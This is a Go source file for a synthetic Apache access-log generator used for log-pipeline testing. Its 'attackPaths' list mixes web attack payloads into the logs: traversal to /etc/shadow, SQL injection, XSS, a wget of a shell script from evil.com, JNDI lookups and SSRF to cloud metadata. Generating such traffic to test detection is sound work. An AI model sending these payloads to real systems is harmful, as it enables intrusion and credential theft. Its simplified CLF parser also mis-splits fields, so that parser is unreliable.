package apache

import (
	"context"
	"fmt"
	"math/rand"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/cenkalti/backoff/v4"
	"github.com/observiq/blitz/output"
	"go.opentelemetry.io/otel"
	"go.opentelemetry.io/otel/attribute"
	"go.opentelemetry.io/otel/metric"
	"go.uber.org/zap"
)

// apacheLogData represents the data needed to generate an Apache CLF log entry
type apacheLogData struct {
	remoteHost string
	identity   string
	userID     string
	timestamp  time.Time
	request    string
	statusCode int
	size       int
	severity   string
}

// ApacheLogGenerator generates Apache Common Log Format (CLF) log data
type ApacheLogGenerator struct {
	logger  *zap.Logger
	workers int
	rate    time.Duration
	wg      sync.WaitGroup
	stopCh  chan struct{}
	meter   metric.Meter

	// Metrics
	apacheLogsGenerated metric.Int64Counter
	apacheActiveWorkers metric.Int64Gauge
	apacheWriteErrors   metric.Int64Counter
}

// New creates a new Apache log generator
func New(logger *zap.Logger, workers int, rate time.Duration) (*ApacheLogGenerator, error) {
	if logger == nil {
		return nil, fmt.Errorf("logger cannot be nil")
	}

	if workers < 1 {
		return nil, fmt.Errorf("workers must be 1 or greater, got %d", workers)
	}

	meter := otel.Meter("blitz-generator")

	// Initialize metrics
	apacheLogsGenerated, err := meter.Int64Counter(
		"blitz.generator.logs.generated",
		metric.WithDescription("Total number of logs generated"),
	)
	if err != nil {
		return nil, fmt.Errorf("create logs generated counter: %w", err)
	}

	apacheActiveWorkers, err := meter.Int64Gauge(
		"blitz.generator.workers.active",
		metric.WithDescription("Number of active worker goroutines"),
	)
	if err != nil {
		return nil, fmt.Errorf("create active workers gauge: %w", err)
	}

	apacheWriteErrors, err := meter.Int64Counter(
		"blitz.generator.write.errors",
		metric.WithDescription("Total number of write errors"),
	)
	if err != nil {
		return nil, fmt.Errorf("create write errors counter: %w", err)
	}

	return &ApacheLogGenerator{
		logger:              logger,
		workers:             workers,
		rate:                rate,
		stopCh:              make(chan struct{}),
		meter:               meter,
		apacheLogsGenerated: apacheLogsGenerated,
		apacheActiveWorkers: apacheActiveWorkers,
		apacheWriteErrors:   apacheWriteErrors,
	}, nil
}

// Start starts the Apache log generator and writes data using the
// provided generator writer.
func (g *ApacheLogGenerator) Start(writer output.Writer) error {
	g.logger.Info("Starting Apache log generator",
		zap.Int("workers", g.workers),
		zap.Duration("rate", g.rate))

	// Record initial active workers count
	g.apacheActiveWorkers.Record(context.Background(), int64(g.workers),
		metric.WithAttributeSet(
			attribute.NewSet(
				attribute.String("component", "generator_apache"),
			),
		),
	)

	for i := 0; i < g.workers; i++ {
		g.wg.Add(1)
		go g.worker(i, writer)
	}

	return nil
}

// Stop stops the Apache log generator.
// This function expects to be called exactly once.
func (g *ApacheLogGenerator) Stop(ctx context.Context) error {
	g.logger.Info("Stopping Apache log generator")

	// Record zero active workers
	g.apacheActiveWorkers.Record(ctx, 0,
		metric.WithAttributeSet(
			attribute.NewSet(
				attribute.String("component", "generator_apache"),
			),
		),
	)

	close(g.stopCh)

	done := make(chan struct{})
	go func() {
		g.wg.Wait()
		close(done)
	}()

	select {
	case <-done:
		g.logger.Info("All workers stopped gracefully")
		return nil
	case <-ctx.Done():
		return fmt.Errorf("stop cancelled due to context cancellation: %w", ctx.Err())
	}
}

// worker runs a single worker goroutine
func (g *ApacheLogGenerator) worker(workerID int, writer output.Writer) {
	defer g.wg.Done()

	g.logger.Debug("Starting worker", zap.Int("worker_id", workerID))

	backoffConfig := backoff.NewExponentialBackOff()
	backoffConfig.InitialInterval = g.rate
	backoffConfig.MaxInterval = 5 * time.Second
	backoffConfig.MaxElapsedTime = 0 // Never stop retrying

	backoffTicker := backoff.NewTicker(backoffConfig)
	defer backoffTicker.Stop()

	for {
		select {
		case <-g.stopCh:
			g.logger.Debug("Worker stopping", zap.Int("worker_id", workerID))
			return
		case <-backoffTicker.C:
			err := g.generateAndWriteLog(writer, workerID)
			if err != nil {
				g.logger.Error("Failed to write log",
					zap.Int("worker_id", workerID),
					zap.Error(err))
				continue
			}
			backoffConfig.Reset()
		}
	}
}

// generateAndWriteLog generates a random log and writes it
func (g *ApacheLogGenerator) generateAndWriteLog(writer output.Writer, workerID int) error {
	// Generate Apache log data
	logData, err := g.generateApacheLogData()
	if err != nil {
		g.recordWriteError("unknown", err)
		return fmt.Errorf("generate Apache log data: %w", err)
	}

	// Format log data as Apache CLF
	logRecord, err := formatAsApacheCLF(logData)
	if err != nil {
		g.recordWriteError("unknown", err)
		return fmt.Errorf("format log as Apache CLF: %w", err)
	}

	// Record logs generated counter
	g.apacheLogsGenerated.Add(context.Background(), 1,
		metric.WithAttributeSet(
			attribute.NewSet(
				attribute.String("component", "generator_apache"),
			),
		),
	)

	// Write the data with timeout
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	if err := writer.Write(ctx, logRecord); err != nil {
		// Classify error type
		errorType := "unknown"
		if ctx.Err() == context.DeadlineExceeded {
			errorType = "timeout"
		}
		g.recordWriteError(errorType, err)
		return err
	}

	return nil
}

// generateApacheLogData generates random Apache log data
func (g *ApacheLogGenerator) generateApacheLogData() (*apacheLogData, error) {
	// Use fast random generator with gosec nosec comment
	r := rand.New(rand.NewSource(time.Now().UnixNano())) // #nosec G404

	data := &apacheLogData{
		timestamp: time.Now(),
	}

	// Generate remote host IP address
	data.remoteHost = generateRandomIP(r)

	// Identity is typically "-" in CLF
	data.identity = "-"

	// Generate request
	data.request = generateRequest(r)

	// Generate status code and severity
	data.statusCode, data.severity = generateStatusAndSeverity(r)

	// Generate response size (100 bytes to 10MB)
	data.size = r.Intn(10000000) + 100 // #nosec G404

	// User ID is typically "-" in CLF
	data.userID = "-"

	return data, nil
}

// generateRandomIP generates a random IP address
func generateRandomIP(r *rand.Rand) string {
	return fmt.Sprintf("%d.%d.%d.%d",
		r.Intn(256), // #nosec G404
		r.Intn(256), // #nosec G404
		r.Intn(256), // #nosec G404
		r.Intn(256)) // #nosec G404
}

// generateRequest generates a random HTTP request string
func generateRequest(r *rand.Rand) string {
	methods := []string{"GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"}
	method := methods[r.Intn(len(methods))] // #nosec G404

	// Normal paths
	normalPaths := []string{
		"/api/v1/users",
		"/api/v1/orders",
		"/health",
		"/status",
		"/api/v2/data",
		"/index.html",
		"/api/v1/auth",
		"/api/v1/payments",
		"/api/v1/transactions",
		"/api/v1/accounts",
		"/api/v1/products",
		"/api/v1/inventory",
		"/api/v1/customers",
		"/api/v1/loans",
		"/api/v1/transfers",
		"/api/v1/verification",
	}

	// Security-focused paths (attack patterns)
	attackPaths := []string{
		// Directory traversal attacks
		"/../../etc/passwd",
		"/..%2f..%2f..%2fetc/passwd",
		"/....//....//....//etc/shadow",
		"/api/v1/files?path=../../../etc/passwd",
		"/download?file=....//....//....//etc/hosts",
		"/static/..%252f..%252f..%252fetc/passwd",

		// SQL injection attempts
		"/api/v1/users?id=1'%20OR%20'1'='1",
		"/api/v1/search?q=';DROP%20TABLE%20users;--",
		"/api/v1/login?user=admin'--&pass=x",
		"/api/v1/products?category=1%20UNION%20SELECT%20password%20FROM%20users",
		"/api/v1/orders?id=1;%20WAITFOR%20DELAY%20'00:00:10'",
		"/api/v1/accounts?name='+OR+1=1--",

		// XSS attempts
		"/search?q=<script>alert('xss')</script>",
		"/api/v1/comments?text=%3Cscript%3Edocument.location='http://evil.com/'%3C/script%3E",
		"/profile?name=<img%20src=x%20onerror=alert(1)>",
		"/api/v1/feedback?msg=<svg/onload=alert('XSS')>",

		// Command injection
		"/api/v1/ping?host=127.0.0.1;cat%20/etc/passwd",
		"/api/v1/backup?file=test|wget%20http://evil.com/shell.sh",
		"/cgi-bin/test.cgi?cmd=ls%20-la",
		"/api/v1/convert?url=http://evil.com/$(whoami)",

		// Scanner and reconnaissance
		"/admin",
		"/admin/login",
		"/wp-admin/",
		"/wp-login.php",
		"/phpmyadmin/",
		"/phpMyAdmin/",
		"/.env",
		"/.git/config",
		"/.git/HEAD",
		"/config.php",
		"/web.config",
		"/server-status",
		"/server-info",
		"/.aws/credentials",
		"/.ssh/id_rsa",
		"/backup.sql",
		"/database.sql",
		"/api/swagger.json",
		"/actuator/env",
		"/actuator/health",
		"/debug/pprof/",
		"/trace",
		"/metrics",

		// Authentication bypass attempts
		"/api/v1/admin?admin=true",
		"/api/v1/users?role=admin",
		"/api/internal/debug",
		"/api/v1/auth/bypass",

		// SSRF attempts
		"/api/v1/fetch?url=http://169.254.169.254/latest/meta-data/",
		"/api/v1/proxy?target=http://localhost:6379/",
		"/api/v1/webhook?callback=http://internal-service:8080/admin",
		"/api/v1/image?src=file:///etc/passwd",

		// Log4j/JNDI injection
		"/api/v1/search?q=${jndi:ldap://evil.com/a}",
		"/api/v1/user-agent?ua=${jndi:rmi://attacker.com:1099/exploit}",

		// Shellshock
		"/cgi-bin/test.sh",
		"/cgi-bin/status",
	}

	// 20% chance of generating a security-focused path
	var path string
	if r.Float64() < 0.20 { // #nosec G404
		path = attackPaths[r.Intn(len(attackPaths))] // #nosec G404
	} else {
		path = normalPaths[r.Intn(len(normalPaths))] // #nosec G404
	}

	protocols := []string{"HTTP/1.0", "HTTP/1.1", "HTTP/2.0"}
	protocol := protocols[r.Intn(len(protocols))] // #nosec G404

	return fmt.Sprintf("%s %s %s", method, path, protocol)
}

// generateStatusAndSeverity generates a random HTTP status code and corresponding severity
func generateStatusAndSeverity(r *rand.Rand) (int, string) {
	// Weight status codes to be more realistic (mostly 2xx, some 4xx, few 5xx)
	roll := r.Float64() // #nosec G404

	switch {
	case roll < 0.85: // 85% success
		statusCodes := []int{200, 201, 204}
		status := statusCodes[r.Intn(len(statusCodes))] // #nosec G404
		return status, "INFO"
	case roll < 0.95: // 10% client errors
		statusCodes := []int{400, 401, 403, 404, 429}
		status := statusCodes[r.Intn(len(statusCodes))] // #nosec G404
		return status, "WARN"
	default: // 5% server errors
		statusCodes := []int{500, 502, 503, 504}
		status := statusCodes[r.Intn(len(statusCodes))] // #nosec G404
		return status, "ERROR"
	}
}

// formatAsApacheCLF converts apacheLogData to Apache Common Log Format
// Format: remotehost rfc931 authuser [date] "request" status bytes
// Example: 127.0.0.1 - - [10/Oct/2000:13:55:36 -0700] "GET /apache_pb.gif HTTP/1.0" 200 2326
func formatAsApacheCLF(data *apacheLogData) (output.LogRecord, error) {
	// Format timestamp as [dd/MMM/yyyy:HH:mm:ss -TZ]
	// Use local timezone offset
	loc := time.Now().Location()
	localTime := data.timestamp.In(loc)
	_, offset := localTime.Zone()
	offsetHours := offset / 3600
	offsetMins := (offset % 3600) / 60
	offsetSign := "+"
	if offsetHours < 0 {
		offsetSign = "-"
		offsetHours = -offsetHours
		offsetMins = -offsetMins
	}
	timestampStr := localTime.Format(fmt.Sprintf("02/Jan/2006:15:04:05 %s%02d%02d", offsetSign, offsetHours, offsetMins))

	// Build CLF line
	clfLine := fmt.Sprintf(`%s %s %s [%s] "%s" %d %d`,
		data.remoteHost,
		data.identity,
		data.userID,
		timestampStr,
		data.request,
		data.statusCode,
		data.size,
	)

	return output.LogRecord{
		Message: clfLine,
		ParseFunc: func(message string) (map[string]any, error) {
			return parseApacheCLF(message)
		},
		Metadata: output.LogRecordMetadata{
			Timestamp: data.timestamp,
			Severity:  data.severity,
		},
	}, nil
}

// parseApacheCLF parses an Apache CLF line into a map
func parseApacheCLF(line string) (map[string]any, error) {
	// Apache CLF format: remotehost rfc931 authuser [date] "request" status bytes
	// This is a simplified parser - real CLF can be more complex
	parts := strings.Fields(line)
	if len(parts) < 7 {
		return nil, fmt.Errorf("invalid CLF format: expected at least 7 fields, got %d", len(parts))
	}

	result := make(map[string]any)
	result["remote_host"] = parts[0]
	result["identity"] = parts[1]
	result["user_id"] = parts[2]

	// Parse timestamp [dd/MMM/yyyy:HH:mm:ss -TZ]
	if len(parts) > 3 && strings.HasPrefix(parts[3], "[") {
		timestampStr := strings.Trim(parts[3], "[]")
		result["timestamp"] = timestampStr
	}

	// Parse request "METHOD PATH PROTOCOL"
	if len(parts) > 4 && strings.HasPrefix(parts[4], `"`) {
		requestStr := strings.Trim(parts[4], `"`)
		requestParts := strings.Fields(requestStr)
		if len(requestParts) >= 3 {
			result["method"] = requestParts[0]
			result["path"] = requestParts[1]
			result["protocol"] = requestParts[2]
		}
		result["request"] = requestStr
	}

	// Parse status code
	if len(parts) > 5 {
		if status, err := strconv.Atoi(parts[5]); err == nil {
			result["status"] = status
		}
	}

	// Parse size
	if len(parts) > 6 {
		if size, err := strconv.Atoi(parts[6]); err == nil {
			result["size"] = size
		}
	}

	return result, nil
}

// recordWriteError records metrics for write errors
func (g *ApacheLogGenerator) recordWriteError(errorType string, err error) {
	ctx := context.Background()

	g.apacheWriteErrors.Add(ctx, 1,
		metric.WithAttributeSet(
			attribute.NewSet(
				attribute.String("component", "generator_apache"),
				attribute.String("error_type", errorType),
			),
		),
	)
}
